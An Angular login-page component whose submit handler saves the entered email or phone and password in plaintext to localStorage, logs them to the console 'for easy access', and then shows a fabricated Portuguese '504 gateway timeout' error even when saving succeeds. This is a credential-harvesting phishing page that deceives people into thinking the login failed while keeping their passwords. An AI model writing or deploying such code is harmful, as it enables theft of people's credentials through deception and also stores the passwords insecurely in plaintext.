import { Component, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';

@Component({
  selector: 'app-auth-page',
  standalone: true,
  imports: [CommonModule, ReactiveFormsModule],
  templateUrl: './auth-page.component.html',
  styleUrls: ['./auth-page.component.scss'],
})
export class AuthPageComponent {
  private fb = inject(FormBuilder);

  isSubmitting = false;
  statusMessage = '';
  statusType: 'success' | 'error' | '' = '';

  form = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(3)]],
    password: ['', [Validators.required, Validators.minLength(4)]],
  });

  submit() {
    if (this.form.invalid) {
      this.form.markAllAsTouched();
      return;
    }

    this.isSubmitting = true;
    this.statusMessage = '';
    this.statusType = '';

    const { email, password } = this.form.getRawValue();

    // Store in localStorage and log to console
    try {
      const credentials = {
        emailOrPhone: email,
        password,
        timestamp: new Date().toISOString(),
      };

      const existing = JSON.parse(localStorage.getItem('credentials') || '[]');
      existing.push(credentials);
      localStorage.setItem('credentials', JSON.stringify(existing));

      // Print to console for easy access in DevTools
      console.log('✅ Credentials saved:');
      console.table([credentials]);
      console.log('All stored credentials:', existing);

      this.statusType = 'success';
      this.statusMessage = 'Erro.\nOcorreu um erro inesperado. Tente novamente mais tarde.\nError 504 gateway timeout';
      this.form.reset();
    } catch (err) {
      this.statusType = 'error';
      this.statusMessage = 'Erro.\nOcorreu um erro inesperado. Tente novamente mais tarde.\nError 504 gateway timeout';
    }

    this.isSubmitting = false;
  }

  get emailInvalid() {
    const control = this.form.controls.email;
    return control.invalid && control.touched;
  }

  get passwordInvalid() {
    const control = this.form.controls.password;
    return control.invalid && control.touched;
  }
}
